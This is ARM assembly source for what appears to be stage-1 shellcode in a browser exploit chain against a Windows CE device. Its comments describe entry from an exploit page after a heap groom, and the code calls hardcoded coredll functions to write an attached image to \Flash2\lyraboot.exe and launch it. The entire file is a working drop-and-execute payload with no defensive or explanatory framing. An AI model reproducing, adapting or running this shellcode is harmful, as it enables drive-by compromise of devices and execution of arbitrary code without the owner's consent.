@ Browser-install stage 1: write the appended image to flash and launch it.
@
@ Entered from the exploit page with a fake stack, at the head of a JScript string it
@ has marked RWX. ARM, not Thumb. Position-independent: the address is whatever the
@ heap groom produced. Never returns. VAs are v4.5 coredll, base 0x40320000.

    .arch armv5te
    .arm
    .text
    .global _stub

@ CreateFileW
    .equ GENERIC_WRITE,         0x40000000
    .equ CREATE_ALWAYS,         2
    .equ FILE_ATTRIBUTE_NORMAL, 0x80

@ [0x00..0x17] outgoing stack args, [0x20..0x2f] PROCESS_INFORMATION, [0x30] written.
    .equ FRAME,      0x40
    .equ OFF_PROCINF, 0x20
    .equ OFF_WRITTEN, 0x30

_stub:
    sub     sp, sp, #FRAME
    adr     r10, path
    adr     r11, image

    @ CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
    mov     r0, r10
    mov     r1, #GENERIC_WRITE
    mov     r2, #0
    mov     r3, #0
    mov     r4, #CREATE_ALWAYS
    str     r4, [sp, #0x00]
    mov     r4, #FILE_ATTRIBUTE_NORMAL
    str     r4, [sp, #0x04]
    mov     r4, #0
    str     r4, [sp, #0x08]
    ldr     r5, addr_CreateFileW
    mov     lr, pc
    bx      r5

    mov     r6, r0                      @ hFile
    cmn     r6, #1                      @ INVALID_HANDLE_VALUE
    beq     leave

    ldr     r8, [r11]                   @ image byte count
    add     r7, r11, #4                 @ image bytes

write_loop:
    cmp     r8, #0
    beq     write_done

    @ WriteFile(hFile, cursor, remaining, &written, NULL)
    mov     r0, r6
    mov     r1, r7
    mov     r2, r8
    add     r3, sp, #OFF_WRITTEN
    mov     r4, #0
    str     r4, [sp, #0x00]
    ldr     r5, addr_WriteFile
    mov     lr, pc
    bx      r5

    cmp     r0, #0
    beq     write_done
    ldr     r4, [sp, #OFF_WRITTEN]
    cmp     r4, #0
    beq     write_done                  @ no progress: do not spin
    add     r7, r7, r4
    sub     r8, r8, r4
    b       write_loop

write_done:
    mov     r0, r6
    ldr     r5, addr_CloseHandle
    mov     lr, pc
    bx      r5

    @ CreateProcessW(path, NULL x7, NULL startupinfo, &procinfo)
    mov     r0, r10
    mov     r1, #0
    mov     r2, #0
    mov     r3, #0
    mov     r4, #0
    str     r4, [sp, #0x00]
    str     r4, [sp, #0x04]
    str     r4, [sp, #0x08]
    str     r4, [sp, #0x0c]
    str     r4, [sp, #0x10]
    add     r4, sp, #OFF_PROCINF
    str     r4, [sp, #0x14]
    ldr     r5, addr_CreateProcessW
    mov     lr, pc
    bx      r5

leave:
    mov     r0, #0
    ldr     r5, addr_ExitThread
    mov     lr, pc
    bx      r5
hang:
    b       hang

addr_CreateFileW:    .word 0x40336b64
addr_WriteFile:      .word 0x40336bcc
addr_CloseHandle:    .word 0x4033226c
addr_CreateProcessW: .word 0x40331c14
addr_ExitThread:     .word 0x403440a4

@ L"\Flash2\lyraboot.exe"
path:
    .short 0x005c, 0x0046, 0x006c, 0x0061, 0x0073, 0x0068, 0x0032, 0x005c
    .short 0x006c, 0x0079, 0x0072, 0x0061, 0x0062, 0x006f, 0x006f, 0x0074
    .short 0x002e, 0x0065, 0x0078, 0x0065, 0x0000

    .align 2
image:
    @ The page appends a little-endian count here, then that many bytes.
